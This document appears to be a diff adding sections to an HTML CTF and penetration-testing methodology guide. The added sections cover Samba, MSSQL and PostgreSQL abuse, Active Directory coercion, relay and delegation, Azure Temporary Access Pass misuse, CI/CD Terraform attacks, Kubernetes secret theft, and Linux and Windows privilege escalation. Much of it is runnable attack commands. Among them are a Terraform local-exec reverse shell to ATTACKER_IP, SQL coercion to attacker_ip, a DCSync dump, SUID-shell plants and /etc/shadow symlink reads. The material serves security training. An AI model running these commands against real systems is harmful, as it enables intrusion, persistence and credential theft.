 <h3 id="75-tool-cheat-sheet">7.5 Tool Cheat-Sheet</h3>
 <table>
 <thead>
@@ -1219,9 +1280,139 @@ hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
 </tr>
 </tbody>
 </table>
+<h3 id="76-samba-specific-misconfigurations">7.6 Samba-Specific Misconfigurations (Linux/Unix SMB hosts)</h3>
+<p>Beyond generic SMB bugs, Samba on Linux has its own configuration-level pitfalls that show up repeatedly in current box-style CTFs:</p>
+<pre><code>├─ "wide links" / follow-symlinks misconfiguration — if a share allows
+│   following symlinks outside the share root, and you can write anything to
+│   that share, plant a symlink pointing at an arbitrary host path (e.g.
+│   another user's home directory) and read/write through it via the share
+├─ Printing subsystem command injection — some Samba print-handling configs
+│   pass a client-supplied value (like a print job name) into a shell command
+│   without escaping; fuzz job-submission fields for shell metacharacters on
+│   any printer-themed box
+└─ Always pull smb.conf if you get any read access to it — it tells you
+    directly whether wide links, follow symlinks, guest access, or writable
+    shares are configured insecurely
+</code></pre>
+<pre><code class="language-bash"># Check share config for risky settings once you have any file read
+cat /etc/samba/smb.conf | grep -iE "wide links|follow symlinks|guest ok|writable|browsable"
+
+# Test a wide-links symlink escape once you have write access to a share
+smbclient //target/ShareName -U user%pass -c "symlink /etc/shadow escape_test"
+smbclient //target/ShareName -U user%pass -c "get escape_test"
+
+# Plant lure files on any writable, anonymously-accessible share to trigger
+# outbound authentication from anyone who browses to it — capture with responder
+git clone https://github.com/Greenwolf/ntlm_theft
+python3 ntlm_theft.py -g all -s attacker_ip -f lure
+</code></pre>
+<h3 id="77-mssql-as-an-attack-surface">7.7 MSSQL as an Attack Surface</h3>
+<p>MSSQL shows up constantly on domain-joined CTF boxes as its own lateral-movement pivot, usually once you have any valid low-priv credential:</p>
+<pre><code>├─ Connect and check current privileges
+│   SQL&gt; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
+├─ Command execution once sysadmin
+│   SQL&gt; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+│   SQL&gt; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+│   SQL&gt; EXEC xp_cmdshell 'whoami';
+├─ Not sysadmin yet? Check impersonation rights (a very common misconfig)
+│   SQL&gt; SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+│   SQL&gt; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
+├─ Coerce authentication from the SQL service account (capture or relay it)
+│   SQL&gt; EXEC master..xp_dirtree '\\&lt;attacker_ip&gt;\share';
+├─ Linked servers — very common cross-trust-boundary pivot
+│   SQL&gt; SELECT * FROM sys.servers;
+│   SQL&gt; SELECT * FROM OPENQUERY([LINKED-SERVER], 'SELECT SYSTEM_USER');
+└─ Read arbitrary files without xp_cmdshell, via impersonation + bulk read
+    SQL&gt; SELECT * FROM OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB) AS f;
+</code></pre>
+<pre><code class="language-bash">impacket-mssqlclient domain/user:Password123@target -windows-auth
+netexec mssql target -u user -p 'Password123' -x whoami   # quick xp_cmdshell wrapper
+</code></pre>
+<h3 id="78-postgresql-as-an-attack-surface">7.8 PostgreSQL as an Attack Surface</h3>
+<pre><code>├─ Service account has no shell / SSH disabled for it?
+│   → port-forward to its UNIX socket instead of trying to log in directly,
+│   then connect to PostgreSQL through the forwarded socket
+├─ Command execution once connected with sufficient privilege
+│   =# COPY (SELECT '') TO PROGRAM 'id &gt; /tmp/proof';   -- COPY ... TO PROGRAM RCE
+├─ Read/write files (superuser only)
+│   =# COPY sensitive_table FROM '/etc/passwd';
+├─ Credential hunting inside the DB itself
+│   — check .psql_history and any application config tables for cleartext
+│   or reused credentials once you have any DB access
+└─ Cron-driven backup utilities (pg_basebackup, pg_dump wrappers) running as
+    root are a common privesc vector — check sudo -l for anything
+    PostgreSQL-backup-related and treat it the same as any other sudo-abuse
+    target (Section 12)
+</code></pre>
+<h3 id="79-modern-ad-coercion-relay-delegation-attacks">7.9 Modern AD Coercion, Relay &amp; Delegation Attacks</h3>
+<p>Once SMB/RPC enumeration confirms an AD environment, current CTFs lean heavily on a family of coercion → relay → delegation chains well beyond basic Kerberoasting. Treat this as the standard next step once you have any domain foothold, before AD CS (Section 14):</p>
+<pre><code>├─ Map the domain graph first
+│   bloodhound-python -u user -p Password123 -d domain -ns &lt;dc_ip&gt; -c All
+│   rusthound-ce -u user -p Password123 -d domain -z
+│   # load into BloodHound CE, look for GenericWrite/GenericAll,
+│   # ForceChangePassword, WriteOwner, and delegation edges
+├─ Coercion — force a privileged account/machine to authenticate to you
+│   petitpotam.py attacker_ip target_ip        # MS-EFSRPC coercion
+│   # printer bug / netexec --coerce-plus also common; capture with responder
+│   # or relay immediately with ntlmrelayx
+├─ Relay targets once you have captured/coerced auth
+│   ├─ Relay to LDAP/LDAPS (signing not enforced) → grant yourself
+│   │   Resource-Based Constrained Delegation (RBCD) on a controlled object
+│   ├─ Relay to AD CS HTTP enrollment endpoint → issue a certificate as the
+│   │   coerced identity (ties into ESC8)
+│   └─ Relay to SMB on a signing-disabled host → direct command execution
+├─ NTLM downgrade — force NTLMv1 instead of NTLMv2 where policy allows it;
+│   NTLMv1 is far faster to crack and, in some configurations, directly
+│   relayable in ways NTLMv2 is not
+├─ RBCD once you control an object (or can create a machine account, which
+│   any domain user can by default up to ms-DS-MachineAccountQuota)
+│   impacket-addcomputer domain/user:Password123 -computer-name ATTACKERPC$ -computer-pass 'Passw0rd!'
+│   impacket-rbcd -action write -delegate-from 'ATTACKERPC$' -delegate-to 'TARGETPC$' domain/user:Password123
+│   impacket-getST -spn cifs/targetpc.domain -impersonate Administrator -dc-ip &lt;dc_ip&gt; domain/'ATTACKERPC$':'Passw0rd!'
+├─ Shadow credentials (GenericWrite/msDS-KeyCredentialLink abuse)
+│   certipy shadow auto -u user@domain -p Password123 -account TargetUser -dc-ip &lt;dc_ip&gt;
+├─ gMSA credential retrieval (read access to msDS-ManagedPassword)
+│   impacket-GMSADumper -u user -p Password123 -d domain -l &lt;dc_ip&gt;
+├─ dMSA / "Bad Successor" abuse — on domains at the Windows Server 2025
+│   functional level, write access over the dMSA migration feature can let a
+│   low-priv account create a delegated managed service account that
+│   inherits a target principal's group memberships — check for this
+│   whenever a 2025-level DC is in scope
+├─ Cross-forest / cross-domain trust abuse — a bidirectional trust with SQL
+│   linked servers or shared service accounts across forests can let you
+│   ride a compromised identity or captured machine-account TGT across the
+│   trust boundary; always check for linked servers/trusts once you have
+│   SYSTEM on any domain-joined SQL host
+└─ Once any elevated credential/ticket is obtained
+    impacket-secretsdump domain/user:pass@dc_ip -just-dc-ntlm   # DCSync-style dump
+</code></pre>
+<pre><code class="language-bash"># Kerberos ticket toolkit
+Rubeus.exe asktgt /user:svc_account /rc4:&lt;NTLM_HASH&gt; /ptt
+klist
+ticketConverter.py ticket.kirbi ticket.ccache
+describeTicket.py ticket.ccache
+
+# DPAPI secret extraction (browser-saved creds, RDCMan files, etc.)
+dpapi.py masterkey -file &lt;masterkey_file&gt; -password 'Password123' -sid &lt;user_sid&gt;
+dpapi.py credential -file &lt;credential_file&gt; -key &lt;decrypted_masterkey&gt;
+</code></pre>
+<p>Tunnel all of the above through <code>chisel</code> or <code>ligolo-ng</code> + <code>proxychains</code> when the AD environment isn't directly reachable from your attack host.</p>
+<h3 id="710-other-services-worth-probing">7.10 Other Services Worth Probing</h3>
+<pre><code>├─ IKE/IPsec VPN (UDP 500) — aggressive mode can leak the VPN identity and a
+│   crackable PSK hash without any credentials
+│   ike-scan -A target
+│   # crack the captured hash with hashcat; the recovered PSK is frequently
+│   # reused for other services (SSH, VPN client config) on the same box
+├─ Erlang-based services (some SSH/telnet-fronted admin consoles run an
+│   Erlang shell) — if you can reach the Erlang distribution port or an
+│   exposed console, treat it as a full code-execution interface, not just
+│   a chat/monitoring protocol
+└─ Always re-check UDP, not just TCP — SNMP, IKE, TFTP, and NetBIOS name
+    service are frequently the only foothold on network-appliance-themed boxes
+</code></pre>
 <hr/>
 </section>
-<section id="8-ai-llm-security-methodology-tools" class="doc-section cat-ai" data-cat="ai" data-label="AI/LLM"><h2 id="8-ai-llm-security-methodology-tools">8. AI / LLM SECURITY — Methodology &amp; Tools</h2>
+<section class="doc-section cat-ai" data-cat="ai" data-label="AI/LLM" id="8-ai-llm-security-methodology-tools"><h2 id="8-ai-llm-security-methodology-tools">8. AI / LLM SECURITY — Methodology &amp; Tools</h2>
 <p>A newer but now-standard CTF category (seen in HTB, TryHackMe, and dedicated events like CrowdStrike's AI Unlocked). Distinct from classic web bugs because the "vulnerable parser" is a language model rather than deterministic code.</p>
 <pre><code>AI/LLM challenge
 ├─ Identify the interaction surface
@@ -1279,8 +1470,167 @@ hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
 </code></pre>
 <p>Note: as with any refusal-bypass content, treat this category the same as any other CTF bug class — the goal is capturing a flag in a sandboxed challenge environment, not producing generally harmful content against real deployed systems.</p>
 <hr/>
+</section><section class="doc-section cat-cloud" data-cat="cloud" data-label="CLOUD" id="9-cloud-supply-chain-azure-entra-id-ci-cd-infrastructure-as-code-attacks">
+<h2 id="9-cloud-supply-chain-azure-entra-id-ci-cd-infrastructure-as-code-attacks">9. CLOUD &amp; SUPPLY CHAIN — Azure/Entra ID &amp; CI/CD Infrastructure-as-Code Attacks</h2>
+<p>Increasingly common in current CTF/lab platforms (TryHackMe, Hack Smarter Labs) alongside classic box challenges. Two distinct but related attack surfaces: cloud identity/permission misconfigurations (Azure/Entra ID), and infrastructure-as-code pipelines that automatically execute code from pull requests.</p>
+<h3 id="91-decision-tree">9.1 Decision Tree</h3>
+<pre><code>Given cloud/tenant access (creds, portal login, or CLI token)
+├─ Azure/Entra ID engagement?
+│   ├─ Enumerate every identity you can see: users, service principals, app
+│   │   registrations, and their role assignments — the goal is finding an
+│   │   over-privileged App Registration or a role that grants more than the
+│   │   owning user realizes
+│   ├─ Check App Registrations for API permissions that grant identity control
+│   │   (anything like UserAuthenticationMethod.ReadWrite.All, RoleManagement.*,
+│   │   Application.ReadWrite.All) — owning the app == owning that permission
+│   ├─ Can you authenticate as the owner of an over-privileged app?
+│   │   └─ Add your own client secret to that app → get an app-only Graph API
+│   │       token → use the app's permissions directly, independent of your
+│   │       own (lower) user permissions
+│   ├─ Got a Graph token with identity-management rights?
+│   │   └─ Issue a Temporary Access Pass (TAP) for a higher-value user →
+│   │       authenticate as them without ever knowing/resetting their password
+│   └─ Once impersonating a higher-priv user, re-check role assignments —
+│       Azure RBAC roles (Network Contributor, VM Data Access Administrator,
+│       etc.) are often split across multiple low-priv users specifically so
+│       no single account looks dangerous alone; chaining them is the point
+├─ CI/CD / Infrastructure-as-Code (Terraform, Atlantis, GitLab CI, GitHub
+│   Actions, Jenkins) reachable?
+│   ├─ Find every git hosting instance (Gitea/GitLab/GitHub) and enumerate
+│   │   public/anonymous-readable repos first — IaC repos routinely leak
+│   │   backend config (state file storage location) even when the state
+│   │   file itself isn't in the repo
+│   ├─ Terraform backend defined (S3/Azure Storage/GCS)? → attempt direct
+│   │   unauthenticated access to that bucket/container — state files are
+│   │   plaintext by default and routinely contain provisioned secrets
+│   │   (SSH keys, cloud credential material, connection strings)
+│   ├─ IaC automation bot present (Atlantis, GitLab CI, Terraform Cloud
+│   │   webhook runner)? → these tools apply Terraform/Ansible/etc.
+│   │   automatically when a pull/merge request is opened or commented on —
+│   │   if you can push a branch and open a PR against an allow-listed repo,
+│   │   you can get the automation to execute arbitrary code as whatever
+│   │   identity the runner uses (often a highly privileged service account
+│   │   or root on the runner host itself)
+│   └─ No direct push access? → check whether any leaked credential
+│       (SSH key from a state file, a bot token found in process listings/
+│       environment variables) grants push rights over the token/UI path
+└─ Once you have host or cloud-API access → pivot into standard Linux/Windows
+    privesc (Sections 12/13) or, on the cloud side, keep walking the RBAC
+    graph for the next over-privileged identity</code></pre>
+<h3 id="92-azure-entra-id-enumeration-abuse">9.2 Azure / Entra ID Enumeration &amp; Abuse</h3>
+<p>Standard enumeration flow once you have any valid credential (portal password, CLI-only account, or a leaked access token):</p>
+<pre><code># CLI login (works even for accounts with no subscription access)
+az login --username user@tenant.onmicrosoft.com --allow-no-subscriptions
+
+# Enumerate role assignments for the current identity
+az role assignment list --assignee user@tenant.onmicrosoft.com --all
+
+# Enumerate App Registrations and their owners
+az ad app list --query "[].{name:displayName, appId:appId, id:id}"
+az ad app owner list --id &lt;app-object-id&gt;
+
+# Check an app's Graph API permissions — this is the step that reveals whether
+# an app is over-privileged relative to what it should be able to do
+az ad app permission list --id &lt;app-id&gt;
+</code></pre>
+<p>If you own (or can take over) an over-privileged app, mint your own client secret rather than trying to recover the existing one — this works even when the existing secret's value is no longer retrievable through the portal:</p>
+<pre><code>az ad app credential reset --id &lt;app-id&gt; --append --display-name "pwn" --years 1
+
+# Exchange the new secret for an app-only Graph token
+curl -X POST https://login.microsoftonline.com/&lt;tenant-id&gt;/oauth2/v2.0/token \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "client_id=&lt;app-id&gt;" \
+  -d "client_secret=&lt;new-secret-value&gt;" \
+  -d "grant_type=client_credentials" \
+  -d "scope=https://graph.microsoft.com/.default"
+</code></pre>
+<p>With a Graph token that carries an identity-management permission (e.g. authentication-method write access), the highest-value move is usually issuing a Temporary Access Pass for a target user rather than resetting their password — a TAP is a time-limited passwordless credential, so it doesn't trip password-change alerts and doesn't require knowing anything about the target's existing login:</p>
+<pre><code>TOKEN=&lt;graph-access-token&gt;
+
+curl -X POST https://graph.microsoft.com/v1.0/users/&lt;target-upn&gt;/authentication/temporaryAccessPassMethods \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"lifetimeInMinutes": 60, "isUsableOnce": false}'
+</code></pre>
+<p>Use the returned TAP value as the sign-in "password" for that user at the normal login page — no MFA challenge follows a TAP-based sign-in. Once impersonating a higher-privileged identity, re-enumerate role assignments (<code>az role assignment list</code>) — Azure environments frequently split dangerous capability across multiple identities (e.g. one user can manage networking, another can manage VM data access) so that no single compromised account looks alarming in isolation; the privesc path is usually chaining two or three such roles together via TAP-based lateral movement rather than finding one master credential.</p>
+<h3 id="93-ci-cd-infrastructure-as-code-supply-chain-attacks">9.3 CI/CD &amp; Infrastructure-as-Code Supply Chain Attacks</h3>
+<p>Modern CTF labs increasingly model real supply-chain risk: a git host plus an automation bot (Atlantis, GitLab CI, Terraform Cloud) that executes IaC changes automatically. The methodology is consistent regardless of which specific tool is in play:</p>
+<pre><code>├─ Enumerate git hosting for IaC repositories (Terraform/Ansible/CloudFormation)
+│   — even a read-only/public repo is worth pulling, since backend
+│   configuration blocks reveal exactly where remote state lives
+├─ Locate the remote state backend definition (look for a "backend" block in
+│   a Terraform "terraform {}" configuration, or equivalent for other tools)
+│   and attempt direct, unauthenticated access to that storage location
+├─ If the state file is retrievable, treat it as a full secrets dump:
+│   it routinely contains generated SSH private keys, cloud access keys,
+│   database connection strings, and complete infrastructure topology in
+│   plaintext, because Terraform state is not encrypted or redacted by default
+├─ Identify the automation bot's trigger mechanism and allow-listed repos
+│   (process listing, config files, or the bot's own web UI usually reveal
+│   this) — most PR-automation bots execute a plan/apply cycle automatically
+│   on new pull requests or on a specific comment trigger phrase
+└─ If you can push a branch to an allow-listed repo (via a leaked credential,
+    stolen SSH key, or a token with write access), craft a minimal malicious
+    IaC resource that shells out on apply, open a PR, and trigger the bot —
+    this typically runs as a highly privileged local/service account on the
+    automation host itself, well beyond whatever the git platform's own
+    permission model would normally allow you to do directly</code></pre>
+<pre><code># Generic "provisioner shells out" pattern for Terraform-based automation bots —
+# a null_resource with a local-exec provisioner runs arbitrary shell commands
+# on whatever host executes `terraform apply`
+resource "null_resource" "pwn" {
+  provisioner "local-exec" {
+    command = "bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'"
+  }
+}
+
+# Typical git workflow once you have push rights via a recovered key/token
+git checkout -b pwn
+git add malicious.tf &amp;&amp; git commit -m "update"
+git push --set-upstream origin pwn
+
+# Then open a PR and supply whatever comment/label triggers the automation
+# bot's apply step (varies by tool — check its docs/config for the exact
+# trigger phrase, e.g. a literal "apply" comment for Atlantis-style bots)
+</code></pre>
+<p><strong>Tool cheat-sheet</strong></p>
+<table>
+<thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+<tbody>
+<tr><td><code>az</code> (Azure CLI)</td><td>Authenticate, enumerate roles/apps, mint app credentials, query Graph indirectly</td></tr>
+<tr><td>Microsoft Graph API (via <code>curl</code>/httpie)</td><td>Direct identity/authentication-method management once you have a token</td></tr>
+<tr><td>ScoutSuite / Prowler</td><td>Automated cloud misconfiguration scanning (AWS/Azure/GCP) for broader engagements</td></tr>
+<tr><td><code>git</code> + platform API (Gitea/GitLab/GitHub REST)</td><td>Repo enumeration, branch/PR creation without needing UI access</td></tr>
+<tr><td>Terraform CLI</td><td>Inspecting/crafting malicious IaC resources, understanding backend config</td></tr>
+<tr><td>rustscan / nmap / ffuf (vhost mode)</td><td>Discovering internal-only automation hosts (e.g. an Atlantis instance) via subdomain fuzzing once a wildcard cert or DNS zone is known</td></tr>
+</tbody>
+</table>
+<h3 id="94-kubernetes-pod-escape-secret-extraction">9.4 Kubernetes Pod Escape &amp; Secret Extraction</h3>
+<pre><code>├─ Landed a shell inside a pod (via an app-level RCE)? Treat it as a scoped
+│   Linux foothold first, then look specifically for Kubernetes-native loot:
+│   ├─ Service account token — every pod gets one by default unless
+│   │   explicitly disabled; use it directly against the API server
+│   │   cat /var/run/secrets/kubernetes.io/serviceaccount/token
+│   ├─ Query the API server with that token to enumerate what the pod's
+│   │   service account can see/do — often more than intended
+│   │   curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+│   │     https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+│   └─ Kubernetes Secrets are base64-encoded, not encrypted, by default —
+│       decode anything you can read
+├─ Can the pod reach other pods/services on the internal cluster network?
+│   → pivot exactly like any other internal network segment; scan for
+│   internal-only services (databases, legacy apps) not exposed externally
+├─ Container escape opportunities from inside a pod
+│   ├─ Overly permissive pod security context (privileged: true, or
+│   │   hostPath volume mounts) — check mounted volumes for host filesystem
+│   │   access straight out of the container
+│   └─ Container runtime CVEs (e.g. runc breakout bugs) — same class of bug
+│       as the standalone Docker/runc escapes covered in Linux Privesc
+└─ Once you have any cluster-admin-capable credential, standard Kubernetes
+    post-exploitation applies: create a privileged pod/deployment that mounts
+    the host filesystem, or directly read every Secret in every namespace
+</code></pre>
 </section>
-<section id="9-cross-cutting-skills-worth-practicing" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="9-cross-cutting-skills-worth-practicing">9. Cross-Cutting Skills Worth Practicing</h2>
+<section class="doc-section cat-meta" data-cat="meta" data-label="META" id="10-cross-cutting-skills-worth-practicing"><h2 id="10-cross-cutting-skills-worth-practicing">10. Cross-Cutting Skills Worth Practicing</h2>
 <table>
 <thead>
 <tr>
@@ -1319,7 +1669,7 @@ hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
 </table>
 <hr/>
 </section>
-<section id="10-suggested-practice-path" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="10-suggested-practice-path">10. Suggested Practice Path</h2>
+<section class="doc-section cat-meta" data-cat="meta" data-label="META" id="11-suggested-practice-path"><h2 id="11-suggested-practice-path">11. Suggested Practice Path</h2>
 <ol>
 <li>picoCTF / OverTheWire (Bandit, Narnia) → fundamentals across categories.</li>
 <li>pwn.college → deep pwn/kernel progression.</li>
@@ -1333,7 +1683,7 @@ hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
 <h1 id="part-ii-privilege-escalation-in-depth">PART II — PRIVILEGE ESCALATION (IN-DEPTH)</h1>
 <p>Covers Linux and Windows privesc end-to-end: enumeration → vector identification → exploitation → tool reference. Picks up right where initial access (Part I) leaves off — you've got a low-priv shell, now you need root/SYSTEM.</p>
 </section>
-<section id="11-privesc-decision-tree-top-level" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC"><h2 id="11-privesc-decision-tree-top-level">11. Privesc Decision Tree (top level)</h2>
+<section class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC" id="12-privesc-decision-tree-top-level"><h2 id="12-privesc-decision-tree-top-level">12. Privesc Decision Tree (top level)</h2>
 <pre><code>Landed a low-priv shell
 ├─ Identify OS → Linux or Windows branch below
 ├─ Run automated enum script FIRST (saves hours), but still read output manually —
@@ -1343,7 +1693,7 @@ hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
 </code></pre>
 <hr/>
 </section>
-<section id="12-linux-privesc" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · LINUX"><h2 id="12-linux-privesc">12. LINUX PRIVESC</h2>
+<section class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · LINUX" id="13-linux-privesc"><h2 id="13-linux-privesc">13. LINUX PRIVESC</h2>
 <h3 id="11-decision-tree">1.1 Decision Tree</h3>
 <pre><code>Low-priv Linux shell
 ├─ whoami / id / groups → note any unusual group membership (docker, lxd, disk, adm)
@@ -1475,6 +1825,109 @@ chmod +s /mnt/share/rootbash
 # on target
 /share/rootbash -p
 </code></pre>
+<p><strong>Packet-capture capability = credential sniffing</strong></p>
+<pre><code class="language-bash"># if non-root users can run tcpdump (via group membership, capability, or a
+# permissive setuid/setcap grant), sniff local loopback/interface traffic for
+# cleartext creds passed between local services
+getcap /usr/bin/tcpdump
+tcpdump -i lo -A -s0 'tcp' 2&gt;/dev/null | grep -iE "pass|user|auth"
+</code></pre>
+<p><strong>systemd drop-in + polkit restart abuse</strong></p>
+<pre><code class="language-bash"># if you have write access to a service's systemd drop-in directory AND a
+# polkit rule permits your user to restart that service, add a pre-start
+# hook that creates a SUID shell before the service (re)starts as root
+mkdir -p /etc/systemd/system/&lt;service&gt;.service.d
+cat &gt; /etc/systemd/system/&lt;service&gt;.service.d/override.conf &lt;&lt;EOF
+[Service]
+ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
+EOF
+systemctl daemon-reload
+systemctl restart &lt;service&gt;   # allowed by the polkit rule even as non-root
+/tmp/rootbash -p
+</code></pre>
+<p><strong>PAM/polkit local-console spoofing + malicious filesystem mount (udisks2)</strong></p>
+<pre><code>├─ A PAM environment-variable misconfiguration can convince Polkit that your
+│   session is a "physically present" local console session even when it
+│   isn't, unlocking policies gated on that condition
+├─ Combined with a udisks2/libblockdev vulnerability, this can let you mount
+│   a crafted filesystem image (e.g. a malformed XFS image) that carries a
+│   pre-built SetUID-root binary, escalating straight to root on mount
+└─ Check `udisksctl --version` and PAM config for these classes of bug on any
+    modern desktop-flavored Linux distro (openSUSE, Fedora, Ubuntu Desktop)
+    — this is a current, actively-exploited privesc chain, not a legacy one
+</code></pre>
+<p><strong>sudo-allowed installer/backup tool path traversal (write outside intended directory)</strong></p>
+<pre><code>├─ Any sudo-allowed tool that downloads/installs packages, plugins, or
+│   dependencies (language package managers, plugin installers) is worth
+│   checking for a path-traversal bug in its own dependency-resolution code
+│   — several package-index implementations across languages have shipped
+│   traversal bugs letting a malicious package name/version write files
+│   (e.g. an SSH authorized_keys entry) outside the intended install directory
+└─ Similarly, sudo-allowed backup/restore tools built on tar/zip extraction
+    are worth checking for path-traversal in the archive-extraction step —
+    a single malicious filename in the archive can write anywhere the
+    running (root) process has permission to write
+</code></pre>
+<p><strong>Custom system-inventory/fact-gathering tool abuse (Puppet facter and similar)</strong></p>
+<pre><code class="language-bash"># if sudo allows running a system-inventory tool with a custom facts/plugins
+# directory option, and that tool loads arbitrary code from files it finds
+# there (Puppet's facter is the classic example), drop a malicious fact file
+# and let sudo execute it as root
+echo 'system("chmod +s /bin/bash")' &gt; /tmp/evil_facts.rb
+sudo facter --custom-dir=/tmp
+</code></pre>
+<p><strong>Race conditions on privileged temp-directory cleanup</strong></p>
+<pre><code>├─ Some privileged setup helpers (package manager confinement wrappers being
+│   a recent, real-world example) create and then tear down a private temp
+│   directory during their startup sequence. If another system component
+│   (a periodic tmpfiles cleanup job) deletes that directory at just the
+│   wrong moment, you can win the race and substitute your own file — e.g.
+│   a malicious dynamic linker — in the path the privileged process expects,
+│   getting it to load and execute your code as root on its next run
+└─ This class of bug rewards scripted repetition over manual timing — loop
+    the race attempt in a tight shell/Python script rather than trying to
+    hit the window by hand
+</code></pre>
+<p><strong>SSH Certificate Authority key exposure</strong></p>
+<pre><code class="language-bash"># if you find an SSH CA private key anywhere on the filesystem, you can sign
+# a certificate for ANY principal — including root — without needing that
+# account's own key or password at all
+ssh-keygen -s ca_key -I "pwned-cert" -n root -V +52w root_key.pub
+ssh -i root_key root@target
+</code></pre>
+<p><strong>Symlink TOCTOU checks in root-run scripts</strong></p>
+<pre><code>├─ Any root-run script that checks a file/path attribute (ownership, type,
+│   permissions) and then acts on that same path in a later, separate step
+│   has a time-of-check-to-time-of-use race window — if you can control the
+│   path between the check and the use, swap in a symlink pointing somewhere
+│   else and the script's later write/read follows your symlink instead of
+│   the originally-checked file
+└─ Look specifically for scripts that resolve a path, validate it, and only
+    THEN open/write it in a separate statement — that gap is the bug
+</code></pre>
+<p><strong>Container runtime escape (runc)</strong></p>
+<pre><code class="language-bash"># a runc container-breakout vulnerability (CVE-2024-21626) allowed a
+# maliciously crafted container image/working-directory file descriptor to
+# leak into the host process, letting code inside the container escape to
+# the underlying host — check your container runtime version whenever you
+# land inside a container and privesc paths inside it look exhausted
+runc --version
+</code></pre>
+<p><strong>Obscured/obfuscated credentials in tool-specific config files</strong></p>
+<pre><code class="language-bash"># some sync/backup tools (rclone is a common CTF example) store passwords in
+# their config using simple reversible obfuscation rather than real
+# encryption — if you find such a config, use the tool's own "reveal" mode
+# rather than trying to brute-force or manually decode it
+rclone obscure --reveal &lt;obscured_password_string&gt;
+</code></pre>
+<p><strong>Recent sudo CVEs worth checking version for</strong></p>
+<pre><code>├─ CVE-2025-32463 — a chroot-related flaw letting a user with any sudo
+│   access at all escalate to full root via crafted nsswitch/plugin loading
+│   inside a fake chroot environment
+└─ CVE-2025-32462 — a flaw in host-restricted sudoers entries (rules meant
+    to only apply on specific hosts) that could be abused to run commands as
+    root regardless of the host restriction
+</code></pre>
 <h3 id="15-tool-cheat-sheet-linux">1.5 Tool Cheat-Sheet (Linux)</h3>
 <table>
 <thead>
@@ -1512,7 +1965,7 @@ chmod +s /mnt/share/rootbash
 </table>
 <hr/>
 </section>
-<section id="13-windows-privesc" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · WINDOWS"><h2 id="13-windows-privesc">13. WINDOWS PRIVESC</h2>
+<section class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · WINDOWS" id="14-windows-privesc"><h2 id="14-windows-privesc">14. WINDOWS PRIVESC</h2>
 <h3 id="21-decision-tree">2.1 Decision Tree</h3>
 <pre><code>Low-priv Windows shell
 ├─ whoami /priv → check for dangerous enabled privileges
@@ -1631,6 +2084,12 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ├─ ESC9/ESC10 — weak certificate mapping still enabled (legacy environments,
 │   pre-Feb 2025 default) → certificate-based authentication doesn't strictly
 │   bind to the intended account, enabling impersonation via UPN mismatch
+├─ ESC17 — a newer template misconfiguration where the DNS/server-name field
+│   on an issued certificate can be set to an arbitrary value the requester
+│   chooses, rather than being tied to their own machine identity → issue a
+│   certificate for a server name you don't own (e.g. a decommissioned host
+│   that's no longer online to contest the name), then combine with a DNS
+│   record write to point that hostname at infrastructure you control
 └─ Once ANY valid high-priv certificate is obtained → use it to request a TGT
     (Kerberos ticket) via PKINIT, or pass-the-certificate for Schannel auth
 </code></pre>
@@ -1645,6 +2104,42 @@ Certify.exe find /vulnerable
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Administrator
 </code></pre>
 <p>Note: since February 2025 Microsoft enforces Strong Certificate Mapping by default, closing ESC9/ESC10-style weak-mapping attacks unless a CTF box has explicitly downgraded the setting — check <code>StrongCertificateBindingEnforcement</code> before assuming those vectors are viable.</p>
+<p><strong>WSUS hijack for domain-wide code execution</strong></p>
+<pre><code>├─ If you can obtain a certificate/identity for a server name matching (or
+│   redirected to look like) the environment's WSUS server — e.g. via ESC17
+│   plus a DNS record you control — stand up a rogue WSUS server at that
+│   identity
+├─ Clients configured to trust that WSUS server will pull and install
+│   "updates" from it automatically
+├─ Package a malicious update (e.g. one that adds your controlled account to
+│   the local administrators group) and let normal WSUS update-check
+│   behavior deliver and execute it domain-wide, without needing to touch
+│   each host individually
+└─ This is a powerful "quiet" persistence/escalation path precisely because
+    it rides on infrastructure that's already trusted and automated
+</code></pre>
+<p><strong>Monitoring/management agent abuse (CheckMk, and similar agent-based tools)</strong></p>
+<pre><code>├─ Monitoring agents that run as SYSTEM and periodically execute
+│   files placed in an agent-writable directory are a reliable lateral/
+│   privesc vector once you land on a host running one
+├─ CVE-2024-0670 (CheckMk agent) is a concrete example: it allows dropping
+│   write-protected files into a temp directory that the agent
+│   subsequently executes as SYSTEM, effectively bypassing intended write
+│   protections on that directory
+└─ General pattern to look for: any agent/daemon that runs with elevated
+    privileges and periodically executes content from a directory with
+    looser permissions than the agent's own privilege level
+</code></pre>
+<p><strong>Enterprise backup software CVEs (Veeam and similar)</strong></p>
+<pre><code>├─ Enterprise backup platforms (Veeam Backup &amp; Replication is a common CTF
+│   example, CVE-2023-27532) have repeatedly shipped deserialization or
+│   credential-disclosure bugs in their service-to-service communication
+│   protocols, letting an attacker with network access to the backup service
